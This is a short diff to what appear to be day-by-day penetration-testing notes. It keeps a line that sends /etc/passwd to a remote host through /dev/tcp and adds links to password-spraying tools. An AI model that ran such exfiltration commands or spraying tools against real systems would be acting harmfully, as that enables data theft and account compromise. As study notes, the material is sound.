@@ -46,9 +46,6 @@ echo "" > /dev/tcp/142.250.138.139/443
 
 Send a file: 
 ```
-cat /path/to/file > /dev/tcp/ip/port
-```
-```
 cat /etc/passwd > /dev/tcp/10.10.10.10/4444
 ```
 
@@ -76,6 +73,15 @@ Can use telnet, too (although it is not a cat): telnet ip port
 ### Auto-updated wordlist for pw guessing based on current, relevant seasons, months, and year:
 
 http://weakpasswords.net/
+
+
+### Password Spraying
+
+DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray/
+
+SprayingToolkit: https://github.com/byt3bl33d3r/SprayingToolkit
+
+TrevorSpray: https://github.com/blacklanternsecurity/TREVORspray
 
 
 ## Day 3
